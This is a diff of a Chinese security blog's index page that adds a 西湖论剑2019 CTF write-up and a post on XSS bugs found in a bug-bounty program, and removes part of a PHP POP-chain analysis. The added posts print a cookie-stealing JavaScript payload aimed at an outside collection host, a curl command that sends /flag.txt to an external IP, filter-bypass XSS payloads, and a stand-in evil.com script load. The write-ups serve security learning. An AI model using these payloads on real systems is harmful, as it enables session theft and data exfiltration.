@@ -90,6 +90,210 @@
     
         <article class="post">
             <h1>
+                <a class="title" href="/2019/04/08/西湖论剑2019-Writeup/"> 
+                    西湖论剑2019-Writeup 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-04-08   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h1 id="西湖论剑2019-Writeup"><a href="#西湖论剑2019-Writeup" class="headerlink" title="西湖论剑2019-Writeup"></a>西湖论剑2019-Writeup</h1><p>Author:Hpdoger@D0g3</p>
+<p>这次比赛的Web题顺序放的很有意思。先放web3、再web2、接着web1来了个bug题被秒。ak了三个web之后本来都出去买奶茶喝了，结果比赛末尾有师傅说上了个web4…好在最后零解23333</p>
+<h1 id="Web-3"><a href="#Web-3" class="headerlink" title="Web-3"></a>Web-3</h1><p>扫描到DS_Store文件泄露：<a href="http://ctf3.linkedbyx.com/11182/DS_Store" target="_blank" rel="noopener">http://ctf3.linkedbyx.com/11182/DS_Store</a><br><img src="http://static.zybuluo.com/1160307775/y7a0rdxx52eav7p0rn96oikc/image_1d7rcmc741ep8qtr17um15g5v49.png" alt="image_1d7rcmc741ep8qtr17um15g5v49.png-31.9kB"></p>
+<p>扫描了一下e1xxx这个自路径发现一处git泄露：<br><img src="http://static.zybuluo.com/1160307775/4utptwr6qxtydxzsxhry0pvr/image_1d7rcont5k191lp1131q17k81eri4m.png" alt="image_1d7rcont5k191lp1131q17k81eri4m.png-38.3kB"></p>
+<p>访问到github仓库:<a href="https://github.com/cumtxujiabin/zip" target="_blank" rel="noopener">https://github.com/cumtxujiabin/zip</a><br><img src="http://static.zybuluo.com/1160307775/ucxu7j63r39crwi3tci5vl0x/image_1d7rcp5i018i0sesg9a1oec9g353.png" alt="image_1d7rcp5i018i0sesg9a1oec9g353.png-78.6kB"></p>
+<p>源码git clone下来看，发现Backup这个zip包需要密码，但是同文件夹下有Index.php和jpg被解压出来了。猜测是已知明文攻击<br><img src="http://static.zybuluo.com/1160307775/vhc6g73jwf6obx3j6edutvqy/image_1d7rcsqca1qcl1538t7j1mpti6f60.png" alt="image_1d7rcsqca1qcl1538t7j1mpti6f60.png-37.5kB"></p>
+<p>用AR跑了一下得到hint文件<br><img src="http://static.zybuluo.com/1160307775/kw4offpg4avzpe0ccs5ji599/image_1d7s0v7dd1djv10opn7j11jq113cei.png" alt="image_1d7s0v7dd1djv10opn7j11jq113cei.png-72.4kB"></p>
+<p>点开hint有两个提示，</p>
+<ol>
+<li>很明显这个code就是之前首页的参数值<br><img src="http://static.zybuluo.com/1160307775/qr951e5gxpg4860aulbxpnvj/image_1d7riioviv8dnt21j3g1m6s1l9j6q.png" alt="image_1d7riioviv8dnt21j3g1m6s1l9j6q.png-14.9kB"></li>
+<li>seed应该暗示着随机数/种子</li>
+</ol>
+<p>拿着Code请求得到一个数，结合hint猜测是要用兑换码爆破随机数种子<br><img src="http://static.zybuluo.com/1160307775/lfy0x9hxu4icygym0gkvnrx5/image_1d7rilc951g6t1idm1qtg1osbjnv77.png" alt="image_1d7rilc951g6t1idm1qtg1osbjnv77.png-61.2kB"></p>
+<p>最后跑出来种子+.txt后缀请求得到flag<br><img src="http://static.zybuluo.com/1160307775/a6w2254ge2kgzj3ltc4t7gau/image_1d7rkjigs14vl1gg9h801mr18onag.png" alt="image_1d7rkjigs14vl1gg9h801mr18onag.png-40kB"><br><img src="http://static.zybuluo.com/1160307775/sj0b5o6mrowzi3y4jl0ce6cn/image_1d7rkfg2e1enjh0g1kif2lb14ala3.png" alt="image_1d7rkfg2e1enjh0g1kif2lb14ala3.png-23.2kB"></p>
+<p>略脑洞。。</p>
+<h1 id="Web-2"><a href="#Web-2" class="headerlink" title="Web-2"></a>Web-2</h1><p>题目环境关了有些无法截图</p>
+<p>随便输入账号都能登陆，有留言功能、提交给管理员url的功能和EXEC页面，EXEC我推测是个命令执行但是需要管理员权限，所以应该是XSS-&gt;admin-&gt;rce。留言位置可以插入标签iframe\img\svg.. 但是过滤掉了等号，会被转译成:)，我测试的时候用iframe以base64编码属性就能绕过</p>
+<pre><code>&lt;iframe/src=&quot;data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==</code></pre><p>编码内容即<code>&lt;img src=x onerror=alert(1)&gt;</code>，可以弹出对话框，</p>
+<p>看到了提交Url处有这么一句话，大致好像是这么说的：管理员会拿着你的token来请求页面，之前还在想管理员怎么请求到我的main(因为我测试可以缓存js文件，可能也是一个方面)，但是看到这里就完全不用担心了，直接X一个储值型的标签打COOKIE</p>
+<p>但是测试用js uri加载外源js不能成功，打不到cookie。</p>
+<p>那么我们可不可以直接src下调用Javascript伪协议执行一段js发送COOKIE到平台呢？用ascii编码html字符去bypass</p>
+<p>编码转换+exp如下<br><img src="http://static.zybuluo.com/1160307775/b5tqrpd78fjkvlld0e7sxvy9/image_1d7rltv912q91kmukju81714bjbn.png" alt="image_1d7rllved1r0b1ku31lp717bi3hdat.png-71.2kB"></p>
+<p>url编码处理一下&amp;、#字符<br><img src="http://static.zybuluo.com/1160307775/amfts3uhddl0jr31udpj9qpa/image_1d7rloelagnr1aib1g56184q16cpba.png" alt="image_1d7rloelagnr1aib1g56184q16cpba.png-153kB"></p>
+<p>在平台打到cookie，发现存在admin字段<br><img src="http://static.zybuluo.com/1160307775/e3jfk48x3gtv1b2sv72x2rkh/image_1d7rlvepfab61co61oj45l6nctc4.png" alt="image_1d7rlvepfab61co61oj45l6nctc4.png-36.5kB"></p>
+<p>带着admin字段去exec.php执行命令就行了<br><img src="http://static.zybuluo.com/1160307775/ucowwhqx8njayw5q0mdhm8rm/image_1d7rm2jhs1ijc1t2898epplgch.png" alt="image_1d7rm2jhs1ijc1t2898epplgch.png-70.5kB"></p>
+<pre><code>curl+&#39;http://50.16.48.95/&#39;+--data+&quot;`cat+/flag.txt`&quot;</code></pre><p><img src="http://static.zybuluo.com/1160307775/lpus3euv91f6ktmyow8un530/image_1d7rm3mr9ffe1d2gqr93lp1obcu.png" alt="image_1d7rm3mr9ffe1d2gqr93lp1obcu.png-57kB"></p>
+<p>编码转换的exp如下</p>
+<pre><code># Author:Hpdoger@d0g3
+
+html_old = &quot;javascript:var website=&#39;http://xssye/index.php&#39;;(function(){(new Image()).src=website+&#39;/?keepsession=1&amp;location=&#39;+escape((function(){try{return document.location.href}catch(e){return&#39;&#39;}})())+&#39;&amp;toplocation=&#39;+escape((function(){try{return top.location.href}catch(e){return&#39;&#39;}})())+&#39;&amp;cookie=&#39;+escape((function(){try{return document.cookie}catch(e){return&#39;&#39;}})())+&#39;&amp;opener=&#39;+escape((function(){try{return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&#39;&#39;}catch(e){return&#39;&#39;}})());})();&quot;
+
+buffer = &quot;&quot;
+
+for zimu in html_old:
+    zimu = ord(zimu)
+    zimu = &quot;&amp;#&quot;+(&quot;%07d&quot;) % (zimu)
+    # print(&quot;&amp;#&quot;+zimu)
+    buffer = buffer + zimu
+print(buffer)</code></pre><h1 id="web-1"><a href="#web-1" class="headerlink" title="web-1"></a>web-1</h1><p>这题上来就有个提示$_GET[‘file’]，打了下etc/passwd有内容</p>
+<p>看到有个提示，base64解码之后是，dir.php<br><img src="http://static.zybuluo.com/1160307775/sn4yzp6jhu22951ixfda9wz9/image_1d7rmb67sieflmcrj41nmodcsdb.png" alt="image_1d7rmb67sieflmcrj41nmodcsdb.png-66.1kB"></p>
+<p>请求dir.php，同时fuzz参数，有个dir(其实略脑洞，我只尝试了file、dir、path就出来了。。<br><img src="http://static.zybuluo.com/1160307775/dqvga0mdv6ohks1ymtth4rbe/image_1d7rmfl1j1rab1ind11sb1ffr1bshdo.png" alt="image_1d7rmfl1j1rab1ind11sb1ffr1bshdo.png-212.3kB"></p>
+<p>看到根目录存在ffxxx的文件，直接用file去读<br><img src="http://static.zybuluo.com/1160307775/8qtcm0dqetiop2w9ccw2tr8k/image_1d7rmhg0ls1l3ptm8k29n614e5.png" alt="image_1d7rmhg0ls1l3ptm8k29n614e5.png-27.7kB"></p>
+<h1 id="MISC3-TTL隐写"><a href="#MISC3-TTL隐写" class="headerlink" title="MISC3 TTL隐写"></a>MISC3 TTL隐写</h1><p>给了个本文，里面是很多TTL值。hint说隐藏了信息。<br><img src="http://static.zybuluo.com/1160307775/m9tv96888aiofm7wv51e4bp3/image_1d7ttpfr51j1m1jks1rd3bafkqjp.png" alt="image_1d7ttpfr51j1m1jks1rd3bafkqjp.png-31.8kB"></p>
+<p>在网上找了一下，发现在MISC中有一项技术叫TTL隐写。</p>
+<p>大致的隐写流程如下：<br>将TTL的值转为8位二进制，高位补0，取头两位的二进制。这样4个TTL的值就能取够一个8位的二进制数，再将这个8位的二进制转换为字符(因为一个字符=一个字节=8位二进制)。</p>
+<p>这就是成功将字符隐写在TTL值中，所以只需要逆出来取8位还原成字符就行，写了个提取脚本</p>
+<pre><code>#! /usr/bin/python3
+# Author: Hpdoger@d0g3
+
+count = 0
+change_list = []
+word_list = &#39;&#39;
+zimus = &#39;&#39;
+
+with open(&quot;ttls.txt&quot;,&quot;r&quot;) as file:
+    for ttl in file.readlines():
+        change_list.append(ttl.replace(&#39;TTL=&#39;,&#39;&#39;))
+        if len(change_list) == 4:
+            for num in change_list:
+                num = int(num)
+                a = bin(num).replace(&#39;0b&#39;,&#39;&#39;)
+                b = str(&quot;%08d&quot; % int(a))
+                infront = b[0:2]
+                word_list = word_list + infront
+
+
+            zimu = int(word_list,2)
+            zimus = zimus+chr(zimu)
+            word_list = &#39;&#39;
+            change_list.clear()
+            count = 0
+
+with open(&#39;results.txt&#39;,&#39;w&#39;) as file2:
+    file2.write(zimus)</code></pre><p>转换出来的结果如下<br><img src="http://static.zybuluo.com/1160307775/0ulidat6fp1h55b84nrtusak/image_1d7tu4dn0ncj1f5s1o7j15641ggr19.png" alt="image_1d7tu4dn0ncj1f5s1o7j15641ggr19.png-147.1kB"></p>
+<p>一看就是16进制，开头ffd8ff是图片头，拖到winhex里还原成图片就行了，最后还原出来4个二维码。</p>
+<p>拼接扫描得到:</p>
+<pre><code>key:AutomaticKey cipher:fftu{2028mb39927wn1f96o6e12z03j58002p}</code></pre><p>维吉尼亚密码解密，得到<br>flag{2028ab39927df1d96e6a12b03j58002v}<br>再进行一次字母转换<br>e-&gt;j,e-&gt;v<br>flag{2028ab39927df1d96e6a12b03e58002e}</p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2019/04/08/西湖论剑2019-Writeup/">
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
+                <a class="title" href="/2019/04/05/SRC挖掘初探之随缘XSS挖掘/"> 
+                    SRC挖掘初探之随缘XSS挖掘 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-04-05   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/论坛文章/">论坛文章</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <p>原文首发于先知社区：<a href="https://xz.aliyun.com/t/4625" target="_blank" rel="noopener">https://xz.aliyun.com/t/4625</a></p>
+<p>Author:Hpdoger@D0g3</p>
+<p>最近试着去学挖洞，在测某SRC的一些业务时发现以下几个XSS的点。对于一些请求参数在返回的html中以隐蔽的标签形式出现的XSS，感觉还是挺常见的。这里我写了个Bp的插件用来监听请求并捕获这种情况:<a href="https://github.com/Hpd0ger/SuperTags" target="_blank" rel="noopener">SuperTags</a></p>
+<p>下面的案例和讨论如果有什么片面或错误的地方，还望师傅们斧正</p>
+<h1 id="登陆跳转处XSS"><a href="#登陆跳转处XSS" class="headerlink" title="登陆跳转处XSS"></a>登陆跳转处XSS</h1><p>某处登陆页面看了眼表单，同时跟进事件绑定的对象utils<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093334-a9875eec-5679-1.png" alt="image_1d6vk2rs4g541hq8olo1sf275i1g.png-83kB"></p>
+<p>直接截出登陆验证部分，redata是响应参数，登陆成功为0。host定义为<strong>normal.com</strong>。这里发现其实在登陆的时候是可以存在一个cb参数的(但之前我登陆的时候并没有察觉，因为是后台有个功能loginout，点击才会附带cb参数到登录页)<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac41e300-5679-1.png" alt></p>
+<p>其中,getparam方法如下</p>
+<pre><code>getParam: function(c_name) {
+    var urlParams = location.href;
+    var c_start = urlParams.indexOf(c_name + &quot;=&quot;);銆€
+    if (c_start != -1) {
+        c_start = c_start + c_name.length + 1;銆€
+        c_end = urlParams.indexOf(&quot;&amp;&quot;, c_start);
+        if (c_end == -1) {
+            c_end = urlParams.length;
+        }
+        return urlParams.substring(c_start, c_end);
+    }else{
+        return null;
+    }
+},</code></pre><p>这里开发者还是对cb参数进行了意识形态的过滤，如果cb不包含host则强制重定向首页。但是略鸡肋，直接把host放在注释符后就能绕过。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac53408c-5679-1.png" alt="image_1d6vkg95e1vjv155m1s1n1c7oook3d.png-54.2kB"></p>
+<p>POC：</p>
+<pre><code>cb=javascript:alert(document.cookie);//normal.com</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac649418-5679-1.png" alt="image_1d6vko6a51n64961h1pcd370647.png-127.7kB"></p>
+<h1 id="Image处的XSS"><a href="#Image处的XSS" class="headerlink" title="Image处的XSS"></a>Image处的XSS</h1><p>这是该厂商的一个移动端业务，在我测之前已经有表哥X进去了，看一下这个洞是如何产生的。</p>
+<p>功能点:提交问题反馈，可以上传问题图片<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac846cde-5679-1.png" alt="image_1d6vivcc51p0mpm5hb61kgqti29.png-76.5kB"></p>
+<p>漏洞逻辑：<br>上传图片-&gt;提交反馈-&gt;服务端拼接提交的img参数(uri)为img标签src属性的完整地址</p>
+<p>测试上传一个图片后，点击提交反馈并抓包，<code>imglist</code>参数是刚才上传图片返回的uri地址。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-aca2a2bc-5679-1.png" alt="image_1d6vj4nch1a5p118b18ci1gu31olam.png-235.9kB"></p>
+<pre><code>POST xxxx?q=index/feedback HTTP/1.1
+
+imglist=%2Cpicture%2F2019%2F02%2F22%2F_a948b4eeaca7420cad9d54fdb0331230.jpg&amp;</code></pre><p>问题就出在拼接标签这部分，修改imglist参数就可以闭合Src属性进行xss,使最终的img标签执行onerror事件</p>
+<p>步骤：抓包修改img路径-&gt;拼接恶意js事件，POC：</p>
+<pre><code>imglist=urlencode(&quot; onerror=&quot;alert(`XSS�`)&quot;&gt;</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-acc0b540-5679-1.png" alt></p>
+<p>成功弹窗<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-accf7fa8-5679-1.png" alt="image_1d6vjv0dfkis172e1mkpd9b78c13.png-78kB"></p>
+<h1 id="邮件提交处的XSS"><a href="#邮件提交处的XSS" class="headerlink" title="邮件提交处的XSS"></a>邮件提交处的XSS</h1><p>在测试某业务的邮箱密码验证时，发现一个包含请求邮箱的页面。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-acea5b84-5679-1.png" alt="image_1d6vf99vp1smijbq1q9pa1s1sfh2d.png-297.8kB"></p>
+<p>记得之前看过一篇文章，有些服务在发送完邮件后会弹出一个“邮件已发送+email”的页面导致反射型XSS，感觉就是这种了。</p>
+<p>随手测试了一下，发现直接waf了空格、双引号、尖括号，和”&quot;。实体了html编码的尖括号，但是没有实体html编码的双引号。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad08fdbe-5679-1.png" alt="image_1d6vf627h11u1ru6slc13uu1qqt1j.png-337.5kB"></p>
+<p>同时在FUZZ的期间多次出现参数错误的请求，发现可能是应用层做了些过滤：</p>
+<ol>
+<li>email字符串长度&lt;40且@结尾</li>
+<li>不能同时出现两个双引号、括号</li>
+<li>正则alert(1)\prompt(1)\confim…</li>
+</ol>
+<p>不过只要脱离引号就好说，毕竟有很多JS事件可以调。一开始把眼光放在了input标签上测试了一些on事件，发现type是hidden，一些可视on事件都没用的。记得之前看过一个input hidden xss的一个用法是按alt+shift+x触发，poc如下</p>
+<pre><code>urlencode(email=&amp;#34/accesskey=&amp;#34X&amp;#34/onclick=&amp;#34alert&amp;#40&#39;xss&#39;&amp;#41&amp;#34@qq.com)</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad17de9c-5679-1.png" alt="image_1d6vfebe9k0q1704vhff8u16cq2q.png-39kB"></p>
+<p>但是这个poc很鸡肋。因为要打出cookie的话长度受限，且利用条件苛刻(firefox+按键)</p>
+<p>回头看了下发现有form标签也有输出点，最初以为form能执行的JS事件就只有reset和submit，后来测试跑onmounseover也能弹框。</p>
+<pre><code>encodeurl(email=&amp;#34/onmouseover=&amp;#34alert&amp;#40document.cookie&amp;#41&amp;#34@qq.com)</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad29e16e-5679-1.png" alt="image_1d71n2s5m1mnpvbslfj1iatkg99e.png-70.9kB"></p>
+<h1 id="一个受阻的XSS"><a href="#一个受阻的XSS" class="headerlink" title="一个受阻的XSS"></a>一个受阻的XSS</h1><p>在测试某业务时发现一个有趣的参数拼接点：</p>
+<p>iframe的src拼接url参数+后端给定的第三方host-&gt;iframe加载src</p>
+<p>测试了一下特殊字符都给实体化了，但是又舍不得一个iframe<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad3e1f30-5679-1.png" alt="image_1d6vl16bn14i9ihun3ovnvnd4k.png-187.5kB"></p>
+<p>经过一番寻找，发现第三方服务的登陆点存在JS跳转漏洞，用iframe加载这个第三方服务的dom-xss也能造成弹框效果<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093341-ad523f1a-5679-1.png" alt="image_1d6vleeqr1r4613u81e81cja1m3h5h.png-106.4kB"></p>
+<p>虽然是在SRC业务站点弹的框，但真正的域应该是子页面的。打印一下COOKIE验证，果然是子页面域的cookie。由于waf掉了document.cookie和javascript:alert，我用了html编码的’:’和八进制js编码的’.’绕过，完整打印子页面域payload如下</p>
+<pre><code>https://src.com?url=redirect_uri%3Djavascript%26%23x3A%3Bconsole.log(document\56cookie)</code></pre><p>在进一步的探索中，我做了两个尝试：</p>
+<ol>
+<li>尝试跳一个外域的JS，看能不能把src属性转到这个js<pre><code>https://src.com?url=redirect_uri%3Dhttps://evil.com/xss.js</code></pre>但是会把资源解析到子页面的document里，而不是src的改变<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093341-ad63994a-5679-1.png" alt="image_1d6vm2dvb1ls2185k1hof58miho5u.png-128.4kB"></li>
+</ol>
+<ol start="2">
+<li>iframe是否能调用父页面的事件呢(document)？如果可以的话我们就直接调js uri把cookie打出去。之所以有这个想法是因为，当时寻思既然站点调用这个三方服务了，很大可能性这个三方站是iframe-src白名单。不过测试后发现依然被跨域限制，测试payload<pre><code>https://src.com?url=redirect_uri%3Djavascript%26%23x3A%3Bconsole.log(window.parent.document\56cookie)</code></pre><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093341-ad6accec-5679-1.png" alt="image_1d6fi5odbg1pnb7nfdgs7ji6p.png-13.7kB"></li>
+</ol>
+<p>对跨域姿势了解的不多，如果有兴趣的师傅，可以一起来交流一下这种问题</p>
+<h1 id="自闭总结"><a href="#自闭总结" class="headerlink" title="自闭总结"></a>自闭总结</h1><p>从打ctf到学着去挖洞，还是有一些思维出入的地方，慢慢理解之前师傅们说的资产收集的重要性。</p>
+<p>也特别感谢引路人鬼麦子师傅给予的帮助，这里顺便推荐麦子师傅基于爬虫的一款开源子域名监控工具<a href="https://github.com/guimaizi/get_domain" target="_blank" rel="noopener">get_domain</a>，在搭建过程中如果遇到环境配置问题，可以参考这篇<a href="http://hpdoger.me/2019/03/30/Ubuntu16.04%E6%90%AD%E5%BB%BA%E5%AD%90%E5%9F%9F%E5%90%8D%E7%9B%91%E6%8E%A7%E6%9C%8D%E5%8A%A1Get_domain/" target="_blank" rel="noopener">Ubuntu16.04-Get_domain搭建手册</a></p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2019/04/05/SRC挖掘初探之随缘XSS挖掘/">
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
                 <a class="title" href="/2019/03/30/Ubuntu16.04搭建子域名监控服务Get_domain/"> 
                     Ubuntu16.04-子域名监控工具Getdomain环境搭建 
                 </a>
@@ -177,7 +381,7 @@ chrome_options.add_argument(&#39;--no-sandbox&#39;) </code></pre><h1 id="相关�
             </div>
             <div class="continue">
             <a href="/2019/03/30/Ubuntu16.04搭建子域名监控服务Get_domain/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -221,7 +425,7 @@ chrome_options.add_argument(&#39;--no-sandbox&#39;) </code></pre><h1 id="相关�
             </div>
             <div class="continue">
             <a href="/2019/03/25/0CTF2019-Web1WriteUp/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -266,7 +470,7 @@ url=/add_contactpoint/dialog/submit/%3fcontactpoint={EMAIL_CHOSEN}%26next=
             </div>
             <div class="continue">
             <a href="/2019/02/18/浅谈绕过Facebook Token进行CSRF账号接管/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -320,7 +524,7 @@ Location: https://my.oppo.com/auth/qqcallback?code=5E0AA09C0CA8179C186688ABAF4BE
             </div>
             <div class="continue">
             <a href="/2019/02/14/Oauth2的两类漏洞挖掘/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -657,7 +861,7 @@ function make_var($val)
             </div>
             <div class="continue">
             <a href="/2019/02/02/Echsop2.7.x几处漏洞分析/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -843,7 +1047,7 @@ Route::set(&#39;index&#39;,function(){
             </div>
             <div class="continue">
             <a href="/2019/01/30/FireShellCTF2019 Bad Injections解题记录/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1011,7 +1215,7 @@ volatility hashdump -f memory --profile=WinXPSP2x86 #查看当前操作系统中
             </div>
             <div class="continue">
             <a href="/2019/01/26/安恒杯月赛19新年场WriteUp/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1235,359 +1439,7 @@ public function input($data = [], $name = &#39;&#39;, $default = null, $filter =
             </div>
             <div class="continue">
             <a href="/2019/01/20/ThinkPHP5.0.0~5.0.23RCE漏洞分析/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2019/01/09/Code-breaking-medium֮lumenserial/"> 
-                    Code-breaking-medium之lumenserial 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2019-01-09   
-                </a>
-                
-                
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <h1 id="Code-breaking-medium之lumenserial"><a href="#Code-breaking-medium之lumenserial" class="headerlink" title="Code-breaking-medium之lumenserial"></a>Code-breaking-medium之lumenserial</h1><p>一道pop链很深的题，复现了一天，到目前已经有九个人做了。太菜了，只能照着柠檬和kk师傅的wp来学习思路。通过这次的复现，感受到耐心对审计的importance。记录一下在学习wp过程中得到的他见与己见。</p>
-<p>题目地址：<a href="https://code-breaking.com/puzzle/7/" target="_blank" rel="noopener">https://code-breaking.com/puzzle/7/</a></p>
-<h1 id="前期"><a href="#前期" class="headerlink" title="前期"></a>前期</h1><p>一个ueditor的页面</p>
-<p>在App\Http\Controllers的EditorController.php里提供了远程下载功能</p>
-<pre><code>private function download($url)
-{
-    $content = file_get_contents($url);</code></pre><p>url可控为以GET形式传入的source值，由于禁止了以下函数，所以只能利用Phar反序列化再打通pop链</p>
-<pre><code>system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,apache_setenv,mb_send_mail,dl,set_time_limit,ignore_user_abort,symlink,link,error_log</code></pre><h1 id="Searching-POP-chain"><a href="#Searching-POP-chain" class="headerlink" title="Searching POP chain"></a>Searching POP chain</h1><p>因为phar反序列化不会反序列化类中的具体函数，所以要找两个魔法方法入口：<code>__destruct|__wakeup</code>这点在柠檬师傅的博客园看到的，也算是经验之谈了。</p>
-<p>首先在namespace Illuminate\Broadcasting里找到PendingBroadcast类存在destruct</p>
-<pre><code>class PendingBroadcast
-{   
-public function __construct(Dispatcher $events, $event)
-{
-    $this-&gt;event = $event;
-    $this-&gt;events = $events;
-}
-public function __destruct()
-    {
-        $this-&gt;events-&gt;dispatch($this-&gt;event);
-    }
-}</code></pre><p>Dispatcher是一个接口，所以这里$event、$events应该都是一个继承于这个接口的obj。但是看了下，一共就只有两个类继承于Dispatcher(BusFake、EventFake)，且都无法利用。所以转向去寻找存在__call方法的类，看是否可以利用。</p>
-<p>为什么要找存在_call方法的类的？根据PHP文档，当一个类里没有定义的方法时，在执行这个不存在方法时，它就会自动调用该类里的__call方法来实现方法重载。</p>
-<p>所以要找一个有_call方法的类–&gt;类ValidGenerator。</p>
-<h1 id="ValidGenerator"><a href="#ValidGenerator" class="headerlink" title="ValidGenerator"></a>ValidGenerator</h1><pre><code>public function __call($name, $arguments)
-{
-    $i = 0;
-    do {
-        $res = call_user_func_array(array($this-&gt;generator, $name), $arguments);
-        $i++;
-        if ($i &gt; $this-&gt;maxRetries) {
-            throw new \OverflowException(sprintf(&#39;Maximum retries of %d reached without finding a valid value&#39;, $this-&gt;maxRetries));
-        }
-    } while (!call_user_func($this-&gt;validator, $res));
-
-    return $res;
-}</code></pre><p>$name的值就是dispatch。如果我们能控制$res，就相当于能控制call_user_func的函数和参数</p>
-<p>由于在call_user_func_array()中，Generator类没有定义dispatch函数，所以又会调用Generator类的_call函数，跟进Generator类</p>
-<h1 id="Generator类"><a href="#Generator类" class="headerlink" title="Generator类"></a>Generator类</h1><pre><code>public function __call($method, $attributes) 
-{
-    return $this-&gt;format($method, $attributes);
-}</code></pre><p>继续跟进format方法</p>
-<pre><code>public function format($formatter, $arguments = array())
-{
-    return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);  
-}</code></pre><p>$formatter的值不可控，且初值为dispatch，继续跟进getFormatter()</p>
-<pre><code>public function getFormatter($formatter)
-{
-    if (isset($this-&gt;formatters[$formatter])) {
-        return $this-&gt;formatters[$formatter];
-    }</code></pre><p>在这步似乎看到了希望，因为它return 了一个数组的值，就比较好控。想办法让<strong>$this-&gt;getFormatter($formatter)</strong>的值是一个数组，即第一次<strong>getFormatter()</strong>返回的值是数组。数组只有一个值仍为<strong>getFormatter</strong>，此时$arguemnts为空，因为call_user_func_array，它就会再调用一次getFormatter方法，参数为空。</p>
-<p>根据getFormatter方法当参数为空时，返回formatters成员的第一个值。</p>
-<p>所以我们需要有两个Generator类：第一个类的formatters成员的键名为dispacth，键值为一个数组(内容为第二个Generator类名$ob2、方法名getFormatter);第二个Generator类的formatters键名随意，键值为我们想要控制的类,此时$res就算可控了。</p>
-<h1 id="回身处理validator"><a href="#回身处理validator" class="headerlink" title="回身处理validator"></a>回身处理validator</h1><p>那么$this-&gt;validator如何处理呢？</p>
-<p>这里看到师傅们找的了一个跳板类，赋值给了validator</p>
-<p><code>phpunit\phpunit\src\Framework\MockObject\Stub\ReturnCallback.php:26</code></p>
-<pre><code>namespace PHPUnit\Framework\MockObject\Stub;
-class ReturnCallback implements Stub
-{
-public function invoke(Invocation $invocation)
-{
-    return \call_user_func_array($this-&gt;callback, $invocation-&gt;getParameters());
-}</code></pre><h2 id="invocation接口实现方法"><a href="#invocation接口实现方法" class="headerlink" title="invocation接口实现方法"></a>invocation接口实现方法</h2><p>getParameters()是接口的一个方法，用来访问私有属性parameters的值</p>
-<p>找到调用这个接口的类就行了，这里是</p>
-<pre><code>namespace PHPUnit\Framework\MockObject\Invocation;
-class StaticInvocation implements Invocation, SelfDescribing
-{
-private $parameters;
